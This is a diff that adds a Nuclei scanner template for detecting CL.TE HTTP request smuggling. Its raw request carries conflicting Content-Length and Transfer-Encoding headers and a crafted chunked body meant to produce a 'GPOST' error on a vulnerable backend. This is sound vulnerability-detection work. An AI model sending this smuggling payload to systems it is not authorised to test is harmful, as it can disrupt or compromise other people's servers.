@@ -1,0 +1,34 @@
+id: http-smuggling-cl-te
+info:
+  name: HTTP Request Smuggling - CL.TE
+  author: WhiteFatalis
+  severity: critical
+  description: Detects CL.TE vulnerabilities where the frontend uses Content-Length and backend uses Transfer-Encoding.
+  tags: smuggling, cl-te
+
+http:
+  - raw:
+      - |
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 6
+        Transfer-Encoding: chunked
+
+        0
+
+        G
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+          - 502
+          - 504
+        # Time based matching is usually better for smuggling, but for nuclei we check for backend anomalies or timeouts
+      - type: word
+        part: body
+        words:
+          - "Unrecognized method GPOST"
+          - "Method Not Allowed"
+        condition: or
